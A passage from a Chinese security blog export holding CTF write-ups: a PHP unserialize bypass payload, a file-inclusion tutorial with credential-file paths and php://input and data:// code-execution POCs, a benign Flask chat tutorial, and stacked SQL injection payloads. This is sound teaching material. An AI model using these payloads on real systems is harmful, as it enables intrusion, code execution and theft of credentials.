“User”后的 2 改为一个比2 大的数字\nPOST 参数O:4:”User”:2:{s:4:”name”;s:3:”Bob”;}：\nnameis Bobbooleanfalse\n\n\n[XCTF]Web – Web_php_unserialize\n题目源码：\n&lt;?php class Demo &#123;     private $file = &#x27;index.php&#x27;;    public function __construct($file) &#123;   #构造函数，对类的变量进行初始化        $this-&gt;file = $file;     &#125;    function __destruct() &#123;         echo @highlight_file($this-&gt;file, true);     &#125;    function __wakeup() &#123;  #魔术方法，如果有反序列化的使用，在反序列化之前会先调用这个方法        if ($this-&gt;file != &#x27;index.php&#x27;) &#123;             //the secret is in the fl4g.php            $this-&gt;file = &#x27;index.php&#x27;;         &#125;     &#125; &#125;if (isset($_GET[&#x27;var&#x27;])) &#123;         #存在$var                       $var = base64_decode($_GET[&#x27;var&#x27;]);   #将$var base64解码并赋值$var    if (preg_match(&#x27;/[oc]:\\d+:/i&#x27;, $var)) &#123;         die(&#x27;stop hacking!&#x27;);     &#125; else &#123;        @unserialize($var);     &#125; &#125; else &#123;     highlight_file(&quot;index.php&quot;); &#125; ?&gt;\n\n思路：主要是正则绕过和_wakeup（）绕过\n正则匹配：因为不能匹配O:4这种，我们可以O:+4绕过，因为在url编码中+会被转换为空格\n__wakeup()绕过：让序列化结果中类属性的数值大于其真正的数值进行绕过\n&lt;?phpclass Demo &#123;    private $file = &#x27;fl4g.php&#x27;;&#125;$a= new demo;$b=serialize($a);  //echo  O:4:&quot;Demo&quot;:1:&#123;s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;&#125;$b=str_replace(&#x27;O:4&#x27;, &#x27;O:+4&#x27;,$b);//绕过preg_match$b= str_replace(&#x27;:1:&#x27;, &#x27;:2:&#x27;,$b);//绕过wakeupecho base64_encode($b);     ?&gt;\n\n得到\n\nTzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ&#x3D;&#x3D;\n\n再进行get传参即可\nphp序列化补充原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL 注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。\nserialize() &#x2F;&#x2F;将一个对象转换成一个字符串unserialize() &#x2F;&#x2F;将字符串还原成一个对象\n触发：unserialize 函数的变量可控，文件中存在可利用的类，类中有魔术方法：\n\n所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。\n\n__call() \t\t\t//在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() \t\t\t//用于从不可访问的属性读取数据__set() \t\t\t//用于将数据写入不可访问的属性__isset() \t\t//在不可访问的属性上调用 isset()或 empty()触发__unset() \t\t//在不可访问的属性上使用 unset()时触发__invoke() \t\t//当脚本尝试将对象调用为函数时触发\n\n构造函数与析构函数\n__construct()具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。\n__destruct()析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。\n\nnew出一个新的对象时就会调用__construct(),而对象被销毁时，例如程序退出时，就会调用__destruct()\n序列化细节序列化含义例如：O:4:&quot;user&quot;:2:&#123;s:3:&quot;age&quot;;i:18;s:4:&quot;name&quot;;s:3:&quot;LEO&quot;;&#125; O代表对象；4代表对象名长度；2代表2个成员变量；其余参照如下\n\n\n\n类型\n结构\n\n\n\nString\ns:size:value;\n\n\nInteger\ni:value;\n\n\nBoolean\nb:value;(保存1或0)\n\n\nNull\nN;\n\n\nArray\na:size:\n\n\nObject\nO:strlen(object name):object name:object size:\n\n\npublic、protected、private下序列化对象的区别php v7.x反序列化的时候对访问类别不敏感\n\npublic变量直接变量名反序列化出来\nprotected变量\\x00 + * + \\x00 + 变量名可以用S:5:&quot;\\00*\\00op&quot;来代替s:5:&quot;?*?op&quot;\nprivate变量\\x00 + 类名 + \\x00 + 变量名\n\nJAVA反序列化下方的特征可以作为序列化的标志参考:\n\n一段数据以rO0AB开头，你基本可以确定这串就是JAVA序列化base64加密的数据。\n\n或者如果以aced开头，那么他就是这一段java序列化的16进制\n\n\n","categories":["Web"],"tags":["PHP","Java","unserialize"]},{"title":"文件包含","url":"/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","content":"文件包含含义本质是输入一段用户能够控制的脚本或者代码，并让服务端执行。\n\n以PHP为例，常用的文件包含\n\ninclude(),require(),include_once(),require_once()\n\n区别\n\n\n*require():*找不到被包含的文件会产生致命警告，并停止脚本运行\n*include():*找不到被包含的文件只会产生警告，脚本继续运行\n*require_once()与require()类似:*唯一的区别就是如果该文件的代码已经被包含，则不会执行\n*include_once()与include()类似:*唯一的区别就是如果该文件的代码已经被包含，则不会执行\n\n\n分析\n\n一个简单的例子，我们利用phpstudy,在网站根目录创建两个文件：\n首先是include.php\n&lt;?php\tinclude $_GET[&#x27;test&#x27;];?&gt;\n\n接着是phpinfo.php\n&lt;?php\tphpinfo();?&gt;\n\n成功解析\n\n\n将phpinfo.php文件后缀改为txt后进行访问，依然可以解析:\n\n\n将phpinfo.php文件后缀改为jpg格式，也可以解析:\n\n\n可以看出，include()函数并不在意被包含的文件是什么类型，只要有php代码，都会被解析出来。\n上传了一jpg格式的一句话木马，如果网站有文件包含漏洞，jpg文件就可以被当做php文件解析，所以这就是文件上传漏洞通常配合文件上传使用。\n本地文件包含漏洞(LFI)能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞(LFI)\n\n\n同时也可以利用该代码，读取一些本地系统的敏感信息\n例如：C:\\Windows\\system.ini\n\n使用绝地路径直接读取:\n\nlocalhost/include.php?filename=C:\\Windows\\system.ini\n\n使用相对路径进行读取:\n\n​\t./ 表示当前路径\n​\t../ 表示上一级路径位置\n例如当前页面所在路径为C:\\Apache24\\htdocs\\，我们需要使用..&#x2F;退到C盘再进行访问，构造路径如下：../../windows/system.ini\n\n常见的敏感目录信息路径:\n\nWindows系统:\n\nC:\\boot.ini &#x2F;&#x2F;查看系统版本\nC:\\windows\\system32\\inetsrv\\MetaBase.xml &#x2F;&#x2F;IIS配置文件\nC:\\windows\\repair\\sam &#x2F;&#x2F;存储Windows系统初次安装的密码\nC:\\ProgramFiles\\mysql\\my.ini &#x2F;&#x2F;Mysql配置\nC:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD &#x2F;&#x2F;MySQL root密码\nC:\\windows\\php.ini &#x2F;&#x2F;php配置信息\n\nLinux&#x2F;Unix系统:\n\n&#x2F;etc&#x2F;password &#x2F;&#x2F;账户信息\n&#x2F;etc&#x2F;shadow &#x2F;&#x2F;账户密码信息\n&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;Apache2默认配置文件\n&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F;虚拟网站配置\n&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F;PHP相关配置\n&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;Apache配置文件\n&#x2F;etc&#x2F;my.conf &#x2F;&#x2F;mysql配置文件\n\nLFI漏洞利用技巧\n配合文件上传使用\n\n有时候我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。\n例题：DVWA File Upload\n源码：\n&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123;    // Where are we going to be writing to?    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;    $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] );    // Can we move the file to the upload folder?    if( !move_uploaded_file( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ], $target_path ) ) &#123;        // No        echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;;    &#125;    else &#123;        // Yes!        echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;    &#125;&#125;?&gt;\n\n简单介绍一下解题思路：\n可以看到，服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。\n上传一句话木马，并通过蚁剑进行连接爆破目录：\n\n\n包含Apache日志文件\n\n利用条件:\n\n对日志文件可读\n知道日志文件存储目录\n\n注意:\n\n一般情况下日志存储目录会被修改，需要读取服务器配置文件(httpd.conf,nginx,conf,……)或者根据phpinfo()中的信息来得知\n日志记录的信息都可以被调整，比如记录报错的等级，或者内容格式\n\n在用户发起请求时，服务器会将请求写入access.log，当发生错误时将错误写入error.log，日志文件如下:\n\n正常访问网页时，access日志会进行记录，如下图记录所示：\n\n包含session文件可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。\n利用条件:\n\n找到Session内的可控变量\nSession文件可读写，并且知道存储路径\n\nphp的session文件的保存路径可以在phpinfo的session.save_path看到。\n\nsession常见存储路径:\n\n&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID\n&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID\n&#x2F;tmp&#x2F;sess_PHPSESSID\n&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID\nsession文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。\n\n包含临时文件php中上传文件，会创建临时文件。在linux下使用&#x2F;tmp目录，而在windows下使用C:\\windows\\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。\n由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。\n另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。\n远程文件包含(RFI)如果PHP的配置选项allow_url_include、allow_url_fopen状态为ON的话，则include&#x2F;require函数是可以加载远程文件的，这种漏洞被称为远程文件包含(RFI)\n\n首先我们来看一段代码include.php\n&lt;?php\t$path=$_GET[&#x27;path&#x27;];\tinclude($path . &#x27;/phpinfo.php&#x27;);?&gt;\n\n127.0.0.1/include.php/path=site访问本地site目录下的phpinfo.php文件:\n该页面并没有对$path做任何过滤，因此存在文件包含漏洞。\n我们在远端Web服务器&#x2F;site&#x2F;目录下创建一个test.php文件，内容为phpinfo()，利用漏洞去读取这个文件。\n但是代码会给我们输入的路径后面加上’&#x2F;phpinfo.php’后缀，如果php版本小于5.3.4，我们可以尝试使用%00截断，这里php版本为7.3.4，不适用。\n还有一种截断方法就是?号截断，在路径后面输入?号，服务器会认为?号后面的内容为GET方法传递的参数，成功读取test.php如下：\n如果test.php是恶意的webshell文件，那么利用该漏洞就可以获取到服务器权限。\nPHP伪协议PHP内置了很多URL风格的封装协议，可用于类似fopen()、copy()、file_exists()和filesize()的文件系统函数\n如下所示\n1.file:&#x2F;&#x2F;协议file:&#x2F;&#x2F; 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响file:&#x2F;&#x2F; [文件的绝对路径和文件名]\n2.php:&#x2F;&#x2F;协议php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是php://filter和php://inputphp:&#x2F;&#x2F;filter用于读取源码。php:&#x2F;&#x2F;input用于执行php代码。\nphp:&#x2F;&#x2F;filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。利用条件:\n\nallow_url_fopen ：off&#x2F;on\nallow_url_include：off&#x2F;on\n\n例如有一些敏感信息会保存在php文件中，如果我们直接利用文件包含去打开一个php文件，php代码是不会显示在页面上的，例如打开当前目录下的2.php:他只显示了一条语句，这时候我们可以以base64编码的方式读取指定文件的源码:\n输入php://filter/convert.base64-encode/resource=文件路径得到2.php加密后的源码：再进行base64解码，获取到2.php的完整源码信息：php:&#x2F;&#x2F;input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。利用条件:\n\nallow_url_fopen ：off&#x2F;on\nallow_url_include：on\n\n利用该方法，我们可以直接写入php文件，输入file=php://input，然后使用burp抓包，写入php代码：发送报文，可以看到本地生成了一句话木马：\n3.ZIP:&#x2F;&#x2F;协议zip:&#x2F;&#x2F; 可以访问压缩包里面的文件。当它与包含函数结合时，zip:&#x2F;&#x2F;流会被当作php文件执行。从而实现任意代码执行。\n\nzip:&#x2F;&#x2F;中只能传入绝对路径。\n要用#分割压缩包和压缩包里的内容，并且#要用url编码成%23(即下述POC中#要用%23替换）\n只需要是zip的压缩包即可，后缀名可以任意更改。\n相同的类型还有zlib:&#x2F;&#x2F;和bzip2:&#x2F;&#x2F;\n\n利用条件:\n\nallow_url_fopen ：off&#x2F;on\nallow_url_include：off&#x2F;on\n\nPOC为：\nzip://[压缩包绝对路径]#[压缩包内文件]?file=zip://D:\\1.zip%23phpinfo.txt\n\n\n4.data:&#x2F;&#x2F;协议data:&#x2F;&#x2F; 同样类似与php:&#x2F;&#x2F;input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。从而导致任意代码执行。\n利用data:&#x2F;&#x2F; 伪协议可以直接达到执行php代码的效果，例如执行phpinfo()函数：利用条件:\n\nallow_url_fopen ：on\nallow_url_include：on\n\nPOC为:\ndata://text/plain,&lt;?php phpinfo();?&gt;//如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入：data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=\n\n\n5.伪协议利用条件伪协议的利用方法还有很多，这里就不一一举例了。伪协议的用法小结\n文件包含漏洞防护1、使用str_replace等方法过滤掉危险字符\n2、配置open_basedir，防止目录遍历（open_basedir 将php所能打开的文件限制在指定的目录树中）\n3、php版本升级，防止%00截断\n4、对上传的文件进行重命名，防止被读取\n5、对于动态包含的文件可以设置一个白名单，不读取非白名单的文件。\n6、做好管理员权限划分，做好文件的权限管理，allow_url_include和allow_url_fopen最小权限化\n"},{"title":"基于Flask+websocket实现在线聊天系统","url":"/%E5%9F%BA%E4%BA%8EFlask-websocket%E5%AE%9E%E7%8E%B0%E5%9C%A8%E7%BA%BF%E8%81%8A%E5%A4%A9%E7%B3%BB%E7%BB%9F/","content":"基于Flask+websocket实现在线聊天系统​          web开发就是基于浏览器进行人机交互，当访客登录到指定网址后，不仅可以看到浏览器渲染的画面，同时还可以与后台进行一些操作，再通过浏览器返回后台服务器处理的结果，这段时间一直在摸索利用flask框架来做点有意思的事\n什么是Flask？Flask是一个轻量级的 Python web 开发框架，它为开发者提供了一个简单、直观的方式来创建 web 应用。由于其“微”特性，你可以从一个简单的单文件应用开始，然后根据需要增加更多功能。\nWebsockets 和 Flask-SocketIOWebsockets 是一个网络通信协议，允许服务器和客户端之间进行双向实时通信。与传统的 HTTP 请求相比，Websockets 提供了一个持久的连接，使得数据能够实时、高效地在双方之间流动。Flask-SocketIO 则是一个 Flask 插件，它使得在 Flask 应用中集成 Websockets 变得非常简单。不仅如此，它还提供了一系列的高级功能，如广播、命名空间和房间支持，使得创建复杂的实时应用变得轻而易举。\n大概功能用户管理功能：包括账号登录、注册等功能。\n好友管理功能：允许用户添加和删除好友。\n即时聊天功能：用户可以进行实时的聊天，并且通过@用户名 可以进行私聊。\n&#x27;/&#x27;（首页）：如果用户未登录，则重定向到登录页面；否则，重定向到聊天页面。&#x27;/login&#x27;：处理用户登录，检查凭据是否与数据库匹配。&#x27;/chat&#x27;：如果用户已登录，则渲染聊天页面；否则，重定向到登录页面。&#x27;/logout&#x27;：通过删除用户的会话来注销用户。&#x27;/register&#x27;：处理用户注册，检查用户名是否唯一，并将用户添加到数据库中。定义WebSocket处理程序：&#x27;message&#x27;：处理传入的聊天消息并将其广播到适当的房间。&#x27;join&#x27;：处理用户加入聊天房间并更新房间中在线用户的列表。&#x27;leave&#x27;：处理用户离开聊天房间并更新房间中在线用户的列表。在if __name__ == &#x27;__main__&#x27;:部分，创建数据库表并运行应用程序，允许WebSocket通信以实时处理聊天消息。\n\n创建在线聊天系统\n安装必要的库：\n\npip install Flask flask-socketio\n\n\n初始化Flask 应用并集成SocketIO：\n\nfrom flask import Flask, render_template, request, redirect, url_for, session, flash, jsonifyfrom flask_socketio import SocketIO, join_room, leave_room, emitapp = Flask(__name__)socketio = SocketIO(app)\n\n\n定义简单的路由一呈现聊天室的前端界面:\n\n@app.route(&#x27;/&#x27;)def index():    if &#x27;username&#x27; in session:        return redirect(url_for(&#x27;chat&#x27;))    return render_template(&#x27;login.html&#x27;)\n\n\n为聊天室事件（如加入、发送消息和离开）添加 SocketIO 事件处理函数：\n\n@socketio.on(&#x27;join&#x27;)def join(data):    room = data[&#x27;room&#x27;]    join_room(room)    online_users.add(session[&#x27;username&#x27;])    emit(&#x27;update_online_users&#x27;, &#123;&#x27;online_users&#x27;: list(online_users)&#125;, room=room)@socketio.on(&#x27;leave&#x27;)def leave(data):    room = data[&#x27;room&#x27;]    leave_room(room)    online_users.remove(session[&#x27;username&#x27;])    emit(&#x27;update_online_users&#x27;, &#123;&#x27;online_users&#x27;: list(online_users)&#125;, room=room)\n\n\n最后启动flask应用：\n\nif __name__ == &#x27;__main__&#x27;:    with app.app_context():        db.create_all()        socketio.run(app, debug=True)        # socketio.run(app, host=&#x27;0.0.0.0&#x27;, port=80)\n\n项目展示由于篇幅有限，如需系统完整代码，可点击主页添加QQ获取\n\n总结借助 Flask 和 Flask-SocketIO，你可以轻松创建一个功能齐全的在线聊天室。而 Websockets 保证了数据在服务器和客户端之间的实时交互，为用户提供了一个无缝的体验。这只是一个基础案例，通过该案例我们可以尝试扩展出很多功能，比如在线客服等，并与数据库等技术结合起来，部署在服务器上实现一个自己的通信系统。\n","categories":["Python"],"tags":["Python","html","javascript","css","flask","websocket"]},{"title":"随便注 1","url":"/%E9%9A%8F%E4%BE%BF%E6%B3%A8-1/","content":"强网杯2019-随便注1，测试1&#39; or 1=1 #,初步判定存在SQL注入。\n1&#x27; or 1=1 #\n\n再测试字段数，到3时报错，说明字段数为2.\n1&#x27; order by 1 # \n\n接着尝试union注入,回显了过滤的关键字。\n1&#x27; union select 1,2#\n\n\n然后就是今天学会的新姿势“堆叠注入”了。原理很简单，就是通过 ; 号注入多条SQL语句。先通过show databases爆出数据库。\n0&#x27;; show databases; #\n\n然后用 show tables 尝试爆表。\n0&#x27;; show tables; #\n\n可以看到这里有两个表，我们先尝试爆words表的内容。\n1&#x27;; show columns from words; #\n\n表名为数字时，要用反引号包起来查询。\n0&#x27;; show columns from `1919810931114514 `; #\n\n1，通过 rename 先把 words 表改名为其他的表名。\n2，把 1919810931114514 表的名字改为 words 。\n3 ，给新 words 表添加新的列名 id 。\n4，将 flag 改名为 data 。\n1&#x27;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id    int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#\n\n\n\n","categories":["CTF","BUUCTF"],"tags":["sql注入","buuctf"]}]